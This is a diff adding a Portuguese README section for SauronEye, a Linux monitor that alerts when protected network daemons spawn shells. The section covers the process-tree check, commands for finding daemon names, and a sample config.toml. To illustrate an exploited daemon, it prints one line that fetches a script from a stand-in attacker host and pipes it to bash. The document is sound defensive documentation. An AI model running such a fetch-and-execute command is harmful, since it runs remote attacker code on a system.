@@ -135,6 +135,60 @@ recipient_number = "5511999999999"
 
 ---
 
+## 🛡️ Entendendo o `protected_services` e a Defesa contra RCE
+
+### Como Funciona
+
+Serviços e daemons de rede (como Nginx, Apache, PHP-FPM, BIND/Named, Unbound, MySQL e Redis) foram desenvolvidos para responder a requisições de rede — **nunca** para invocar interpretadores de comandos interativos.
+
+Quando um invasor explora com sucesso uma vulnerabilidade de Execução Remota de Código (RCE) ou injeção de comandos, o daemon explorado inevitavelmente invoca uma shell ou utilitário:
+```text
+[nginx / php-fpm]  ──(spawn anômalo)──►  /bin/bash -c "curl atacante.com/rev.sh | bash"
+```
+
+O **SauronEye** monitora continuamente o pseudo-sistema de arquivos `/proc` do Linux e rastreia a árvore de processos (`PPID` ➔ `PID`). Se um processo cujo nome pai constar na lista **`protected_services`** tentar executar qualquer binário proibido de **`forbidden_children`**, o SauronEye intercepta o evento em milissegundos e envia um **Alerta Crítico de Segurança** contendo:
+- Nome do serviço monitorado e PID pai (`PPID`);
+- Nome do processo filho executado e PID;
+- Linha de comando completa invocada (`cmdline`).
+
+### Como Identificar os Daemons Ativos no seu Servidor
+
+Para descobrir os nomes exatos dos processos (`comm`) rodando no seu servidor e preencher o `protected_services`:
+
+1. **Listar as portas e processos em escuta:**
+   ```bash
+   sudo ss -tulpn
+   ```
+2. **Identificar o nome exato do comando no kernel (`comm`):**
+   ```bash
+   # Substitua <PID> pelo PID real do processo (ex: 1100):
+   cat /proc/<PID>/comm
+   ```
+3. **Ou inspecione diretamente os daemons comuns:**
+   ```bash
+   ps -eo comm,pid,user,args | grep -E "nginx|apache|httpd|php|named|unbound|bind|mysql|mariadb|postgres|redis"
+   ```
+4. **Adicione os nomes encontrados no `config.toml`:**
+   ```toml
+   [rce_detector]
+   enabled = true
+   protected_services = [
+       "nginx",
+       "apache2",
+       "httpd",
+       "php-fpm8.2",
+       "named",
+       "unbound",
+       "mariadbd",
+       "mysqld",
+       "redis-server"
+   ]
+   ```
+
+> **Atenção:** **Não** adicione serviços interativos de login como `sshd` ou `login` no `protected_services`, pois a finalidade legítima do SSH é justamente abrir shells para usuários autenticados.
+
+---
+
 ## Instalação e Implantação
 
 Para passos detalhados de instalação em servidores de produção, configuração do serviço **Systemd** e diretivas de segurança, consulte o **[INSTALL.pt-BR.md](INSTALL.pt-BR.md)**.
